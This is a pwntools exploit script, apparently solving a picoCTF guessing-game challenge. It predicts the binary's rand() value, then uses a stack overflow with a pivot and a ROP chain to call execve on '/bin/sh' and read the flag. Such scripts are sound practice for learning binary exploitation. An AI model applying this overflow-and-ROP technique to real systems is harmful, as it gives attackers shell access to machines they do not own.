#!/usr/bin/env python3

from pwn import *
from ctypes import *

exe = ELF("./vuln", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
glibc = CDLL(libc.path)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        	b* 0x0000000000400C71
        	b* 0x0000000000400C8B
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("jupiter.challenges.picoctf.org", 39940)

# random
random = glibc.rand() % 100
print(random + 1)
p.sendlineafter(b'\n', str(random + 1))

pop_rdi = 0x0000000000400696
pop_rax = 0x00000000004163f4
syscall = 0x000000000040137c
rw_section = 0x6b70a0
payload = flat(
	b'a'*0x70,
	rw_section,
	exe.sym.win + 8,
	)
p.sendlineafter(b'Name? ', payload)

payload = flat(
	b'/bin/sh\0'.ljust(0x78, b'a'),
	pop_rax, 0x3b,
	pop_rdi, rw_section - 0x70,
	syscall
	)
# GDB()
p.sendlineafter(b'Name? ', payload)
p.sendline(b'cat flag.txt')

p.interactive()